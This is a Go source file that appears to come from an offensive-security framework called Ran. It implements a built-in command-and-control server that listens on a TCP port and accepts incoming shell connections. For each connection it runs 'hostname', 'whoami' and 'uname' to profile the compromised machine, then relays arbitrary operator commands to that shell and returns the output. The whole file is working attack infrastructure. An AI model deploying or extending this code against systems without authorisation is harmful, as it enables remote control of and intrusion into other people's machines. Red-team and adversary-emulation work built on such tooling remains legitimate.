package c2

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"

	"github.com/Magier/Ran/domain"
	bus "github.com/Magier/Ran/internal/bus"
)

type BuiltInC2Server struct {
	bus        bus.MessageBus
	cmdChannel chan domain.Command
	ip         net.IP
}

func NewBuiltInServer(bus bus.MessageBus) BuiltInC2Server {
	ip := GetOutboundIP()
	return BuiltInC2Server{
		bus:        bus,
		cmdChannel: make(chan domain.Command, 1),
		ip:         ip,
	}
}

func (c BuiltInC2Server) Connect(ctx context.Context, mb bus.MessageBus) error {
	for {
		select {
		case <-ctx.Done():
			break
		case cmd := <-c.cmdChannel:
			_, err := c.handleCommand(cmd)
			if err != nil {
				slog.Error("BuiltinC2 command failure", "", err.Error())
			}
		}
	}
}

func (c BuiltInC2Server) Execute(ev domain.Command) (domain.Message, error) {
	c.cmdChannel <- ev
	// return nil, fmt.Errorf("Starting Sliver Listener not yet implemented")
	return nil, nil
}

func (c BuiltInC2Server) GetServerIp() net.IP {
	return c.ip
}

func (c BuiltInC2Server) handleCommand(msg domain.Command) (domain.Message, error) {
	switch cmd := msg.(type) {
	case domain.StartListener:
		go func() {
			// TODO handle disconnecting listener
			err := c.startListener(context.Background(), c.bus, cmd)
			if err != nil {
				slog.Error(err.Error())
			}
		}()
	case domain.StopListener:
		err := c.stopListener(cmd)
		return nil, err
	}
	return nil, nil
}

func (c BuiltInC2Server) GetName() string {
	return ""
}

func (c BuiltInC2Server) startListener(ctx context.Context, bus bus.MessageBus, cmd domain.StartListener) error {
	listener, err := net.Listen("tcp", ":"+strconv.FormatUint(uint64(cmd.Port), 10))
	if err != nil {
		return fmt.Errorf("Unable to bind to port: %s", err)
	}
	defer listener.Close()

	listenerId := fmt.Sprintf("builtin_%s", cmd.Protocol)
	err = bus.Publish(ListenerReady{
		Id:       listenerId,
		Name:     fmt.Sprintf("%s_%d", listenerId, cmd.Port),
		IP:       c.GetServerIp(),
		Port:     cmd.Port,
		Protocol: domain.TCP,
	})
	if err != nil {
		slog.Error("Error publishing listener event: " + err.Error())
	}

	numSessions := 0

	for {
		select {
		case <-ctx.Done():
			slog.InfoContext(ctx, "Shutting down listener")
			return nil
		default:
			// Accept incoming connections
			conn, err := listener.Accept()
			if err != nil {
				slog.Error(err.Error())
				continue
			}
			numSessions++

			// bus.Publish()
			// Handle client connection in a goroutine
			in := make(chan string, 5)
			out := make(chan string, 5)
			go handleSession(ctx, bus, conn, strconv.Itoa(numSessions), in, out)
		}
	}
}
func (c BuiltInC2Server) stopListener(cmd domain.StopListener) error {
	return fmt.Errorf("Stopping builtin listener is not yet implemented!")
}

func sendCommand(conn net.Conn, cmd string) (string, error) {
	writer := bufio.NewWriter(conn)
	// _, err := conn.Write([]byte(cmd))
	slog.Debug("Sent command: ", "cmd", cmd)
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		slog.Error("Error sending command: " + err.Error())
		return "", err
	}
	writer.Flush()
	// raw_result := make([]byte, 1024)
	reader := bufio.NewReader(conn)
	s, err := reader.ReadString('\n') // maybe use scanner instead?
	slog.Debug("Rx Simple IO:", s, "")
	if err != nil {
		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
		return "", err
	}
	return strings.Trim(s, "\n"), nil
}

func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, id string, cmds <-chan string, results chan<- string) {
	defer conn.Close()
	slog.Debug("C2", "", "Handling session")

	hostname, err := sendCommand(conn, "hostname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	user, err := sendCommand(conn, "whoami")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	os, err := sendCommand(conn, "uname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	// results <- os
	err = bus.Publish(SessionStarted{Session: Session{
		Id:       id,
		Hostname: hostname,
		Os:       os,
		User:     user,
	}})
	if err != nil {
		slog.Error("Error publishing session started event:", err.Error(), "")
	}

	for {
		select {
		case <-ctx.Done():
			close(results)
			return
		default:
			cmd := <-cmds

			res, err := sendCommand(conn, cmd)
			if err != nil {
				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
			}
			slog.Debug("Received data: " + string(res))
			results <- res
		}
	}
}
